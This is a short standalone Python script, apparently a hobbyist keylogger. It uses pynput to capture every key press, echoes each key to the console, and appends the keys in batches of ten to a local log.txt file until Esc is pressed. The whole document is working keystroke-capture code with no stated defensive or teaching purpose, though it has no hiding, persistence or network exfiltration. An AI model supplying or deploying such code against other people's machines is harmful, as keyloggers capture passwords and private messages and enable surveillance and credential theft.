#!/bin/python3
from pynput.keyboard import Key,Listener

count=0
keys=[]

def pd(k):
	global keys,count
	
	keys.append(k)
	count+=1
	print("{0} pressed \n".format(k))

	if(count >=10): 
		count=0
		write_file(keys)
		keys=[]


def write_file(keys):
	with open("log.txt","a") as f:
		for k in keys:
			kname=str(k).replace("'", "") 
			if kname.find("space")>1:
				f.write(" space ")
			if kname.find("enter")>0:
				f.write("\n")
			elif kname.find("Key")==-1:
				f.write(str(k))
			
	
def rd(k):
	if k==Key.esc:
		return False
		
with Listener(on_press=pd,on_release=rd) as  listener:
	listener.join()		
